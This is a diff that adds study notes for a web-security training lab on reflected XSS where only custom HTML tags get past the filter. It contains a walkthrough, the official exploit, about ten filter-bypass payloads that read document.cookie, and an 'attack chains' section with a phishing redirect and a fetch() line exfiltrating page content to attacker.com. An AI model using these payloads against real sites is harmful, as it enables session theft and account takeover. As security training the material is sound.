@@ -4524,3 +4524,472 @@ Find → Filter → Choose → Trigger → Execute
 - Don’t rely on common payloads  
 - Intruder = discovery tool  
 - Focus on execution  
+
+---
+
+# Lab - 12 📝 Reflected XSS into HTML Context (Custom Tags Only) — Final Notes
+
+---
+
+## 🧭 Overview
+
+This lab demonstrates a Reflected XSS vulnerability where:
+
+- ✔ User input is reflected in HTML  
+- ✔ All standard HTML tags are blocked ❌  
+- ✔ Only custom (unknown) tags are allowed ✔  
+
+👉 Goal:
+
+```js
+alert(document.cookie)
+```
+
+---
+
+## 🧠 Core Concept
+
+- If real tags are blocked → use fake (custom) tags  
+- If no auto execution → force a trigger  
+
+---
+
+## 🔄 Flow
+
+```
+User Input → Server → HTML Response → Browser parses → Custom tag created → Focus triggered → JS executes
+```
+
+---
+
+## 🧠 Source
+
+Search parameter:
+
+```
+?search=INPUT
+```
+
+---
+
+## 🧠 Sink
+
+HTML context (inside page content)
+
+---
+
+## ⚠️ Restrictions
+
+```
+<script> ❌  
+<img> ❌  
+<svg> ❌
+```
+
+✔ All standard tags blocked  
+✔ Custom tags allowed  
+
+---
+
+## 🧠 Key Discovery
+
+👉 Browser accepts ANY unknown tag
+
+Examples:
+
+```html
+<xss></xss>
+<abc></abc>
+<anything></anything>
+```
+
+---
+
+# 🪜 Lab Walkthrough
+
+---
+
+### 🔹 Step 1 — Test Reflection
+
+```
+test123
+```
+
+✔ Appears in page  
+
+---
+
+### 🔹 Step 2 — Try Normal Payload
+
+```html
+<img src=x onerror=alert(1)>
+```
+
+❌ Blocked  
+
+---
+
+### 🔹 Step 3 — Try Custom Tag
+
+```html
+<xss>test</xss>
+```
+
+✔ Allowed  
+
+---
+
+### 🔹 Step 4 — Add Event
+
+```html
+<xss onfocus=alert(1)>
+```
+
+⚠️ Does NOT trigger automatically  
+
+---
+
+### 🔹 Step 5 — Make Element Focusable
+
+```html
+<xss tabindex=1 onfocus=alert(document.cookie)>
+```
+
+✔ Now it can receive focus  
+
+---
+
+### 🔹 Step 6 — Add Auto Trigger (#id)
+
+```html
+<xss id=x onfocus=alert(document.cookie) tabindex=1>
+```
+
+---
+
+## 💥 FINAL EXPLOIT (Official)
+
+```html
+<script>
+location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
+</script>
+```
+
+---
+
+## 🧠 Payload Breakdown
+
+---
+
+### 🔹 Custom Tag
+
+```html
+<xss>
+```
+
+✔ Bypasses WAF  
+
+---
+
+### 🔹 ID
+
+```
+id=x
+```
+
+✔ Used with `#x`  
+
+---
+
+### 🔹 Focusability
+
+```
+tabindex=1
+```
+
+✔ Makes element focusable  
+
+---
+
+### 🔹 Execution
+
+```html
+onfocus=alert(document.cookie)
+```
+
+✔ Runs JS  
+
+---
+
+### 🔹 Trigger
+
+```
+#x
+```
+
+✔ Forces focus  
+
+---
+
+## 🪜 Execution Flow
+
+1️⃣ Victim opens exploit  
+2️⃣ Redirect happens  
+3️⃣ Payload injected  
+4️⃣ Browser sees `#x`  
+5️⃣ Element receives focus  
+6️⃣ onfocus triggers  
+7️⃣ alert executes 💥  
+
+---
+
+## 🧠 Key Learning
+
+- Custom tag = container  
+- Event = execution  
+- Trigger = activation  
+
+---
+
+## 🧠 Focus Concept (Important)
+
+👉 Focus = element becomes active  
+
+Triggered by:
+
+- Clicking  
+- Tab key  
+- URL hash (`#id`)  
+
+---
+
+## 🌍 Real-World Scenarios
+
+---
+
+### 🟢 1️⃣ Custom Tag + Focus (Primary Attack)
+
+```html
+<xss id=x tabindex=1 onfocus=alert(document.cookie)>
+```
+
+Trigger:
+
+```
+#x
+```
+
+---
+
+### 🟢 2️⃣ Autofocus Trick
+
+```html
+<xss autofocus onfocus=alert(document.cookie)>
+```
+
+✔ Auto-trigger  
+
+---
+
+### 🟢 3️⃣ Animation-Based Execution
+
+```html
+<xss style="animation-name:x" onanimationstart=alert(document.cookie)>
+```
+
+---
+
+### 🟢 4️⃣ Transition-Based Execution
+
+```html
+<xss style="transition:1s" ontransitionend=alert(document.cookie)>
+```
+
+---
+
+### 🟢 5️⃣ Click-Based Fallback
+
+```html
+<xss onclick=alert(document.cookie)>
+```
+
+---
+
+### 🟢 6️⃣ Hover-Based Execution
+
+```html
+<xss onmouseover=alert(document.cookie)>
+```
+
+---
+
+### 🟢 7️⃣ Iframe Delivery
+
+```html
+<iframe src="https://target.com/?search=PAYLOAD"></iframe>
+```
+
+✔ Real attack delivery  
+
+---
+
+### 🟢 8️⃣ Multi-Trigger Payload
+
+```html
+<xss id=x tabindex=1 onfocus=alert(1) onmouseover=alert(2)>
+```
+
+---
+
+### 🟢 9️⃣ CSS Display Trick
+
+```html
+<xss style="display:block" onload=alert(1)>
+```
+
+---
+
+### 🟢 🔟 Rare Event Exploitation
+
+```html
+<xss onbeforeinput=alert(1)>
+```
+
+---
+
+## 🎯 High-Value Targets
+
+- Search functionality  
+- Filters  
+- Reflected endpoints  
+- CMS preview pages  
+- Error pages  
+- Marketing pages  
+- Analytics / tracking  
+
+---
+
+## 🔗 Attack Chains
+
+---
+
+### 🔥 Session Hijacking
+
+```js
+document.cookie
+```
+
+---
+
+### 🔥 Account Takeover
+
+✔ Steal tokens / cookies  
+
+---
+
+### 🔥 Admin Compromise
+
+✔ Admin opens link → full takeover  
+
+---
+
+### 🔥 Phishing Redirect
+
+```html
+onfocus="location='https://fake-login.com'"
+```
+
+---
+
+### 🔥 Data Exfiltration
+
+```js
+fetch("https://attacker.com?d="+document.body.innerHTML)
+```
+
+---
+
+## 🧪 Testing Methodology
+
+- Test reflection  
+- Try normal tags  
+- Confirm blocking  
+- Use custom tags  
+- Add event  
+- Make focusable  
+- Add trigger (#id)  
+- Deliver payload  
+- Confirm execution  
+
+---
+
+## ⚠️ Why This XSS Is Special
+
+- All real tags blocked  
+- Custom tags allowed  
+- Requires trigger logic  
+- Realistic WAF bypass  
+
+---
+
+## 🛡 Remediation
+
+- Encode input properly  
+- Block event handlers  
+- Avoid dynamic HTML  
+- Use CSP  
+- Use safe frameworks  
+
+---
+
+## 🧠 Bug Hunter Mindset
+
+👉 Are standard tags blocked?  
+👉 Can I use custom tags?  
+👉 Which events work?  
+👉 Can I force trigger?  
+
+---
+
+## 🧠 Ultimate Mental Model
+
+```
+Bypass filter
+↓
+Inject custom tag
+↓
+Attach event
+↓
+Force trigger
+↓
+Execute
+```
+
+---
+
+## 💡 Extra Tips
+
+- Try random tag names  
+- Always add trigger  
+- Use DevTools  
+- Focus on execution  
+
+---
+
+## ✅ Mastery
+
+✔ Custom tag XSS  
+✔ Focus-based execution  
+✔ WAF bypass  
+✔ Trigger engineering  
+✔ Real payload delivery  
+
+---
+
+## 🚀 Next Level
+
+👉 XSS polyglots  
+👉 CSP bypass  
+👉 DOM + Angular XSS  
+
+---
